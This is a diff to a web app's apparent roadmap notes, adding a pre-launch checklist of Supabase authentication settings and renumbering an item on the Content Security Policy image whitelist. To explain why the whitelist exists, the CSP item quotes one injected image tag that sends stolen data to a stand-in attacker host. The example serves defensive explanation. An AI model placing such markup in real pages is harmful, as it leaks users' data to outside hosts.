@@ -52,7 +52,20 @@ The CSV utility is a perfect first test target — pure functions, clear inputs/
 - For email accounts: trigger `supabase.auth.resetPasswordForEmail(email, { redirectTo })` and add a password-reset landing page that calls `updateUser({ password })`. Needs `redirectTo` configured for the deployed URL.
 - For username-only accounts: no recovery is possible (no email to send to). Show a clear "not available — passwords for username-only accounts cannot be reset." If users want to enable recovery, offer to add an email to their account first (depends on #9). Medium-to-high effort.
 
-### 11. Expand the CSP `img-src` whitelist when adding new poster sources
+### 11. Pre-launch Supabase settings audit (do this before going live)
+Walk through Supabase dashboard → **Authentication** and confirm each setting matches the intended production behavior. Today most of these are at default or set for dev convenience.
+
+- **Sign In / Providers → Email → Confirm email** — currently **OFF** (we turned it off during smoke testing because localhost redirects don't work on phones). For production, turn **ON** so users can't sign up with fake email addresses.
+- **Sign In / Providers → Email → Secure email change** — default **ON**. Verify it's still on. Sends confirmation to BOTH old and new address when changing email (anti-takeover).
+- **URL Configuration → Site URL** — currently `localhost:5173`. Set to the deployed Vercel URL before launch. This is what confirmation/password-reset links redirect to.
+- **URL Configuration → Redirect URLs** — whitelist any allowed redirect destinations (Vercel preview deployments, custom domains, etc.).
+- **Rate Limits** — default per-IP limits. Increase if you expect more traffic; tighten if you want to be more conservative against signup spam.
+- **Email Templates** — customize the templated emails (signup confirmation, email change, password reset) to match your branding. Currently using Supabase's plain defaults.
+- **SMTP Settings** — currently using Supabase's built-in SMTP (≈30 emails/hour rate limit). For real volume, plug in SendGrid / Postmark / Resend.
+- **Allow new users to sign up** — verify it's ON (it is by default; would only turn off if you wanted to lock signups).
+- **Database → Tables → Policies** — re-verify the RLS policies one more time before launch.
+
+### 12. Expand the CSP `img-src` whitelist when adding new poster sources
 `index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.
 
 ---
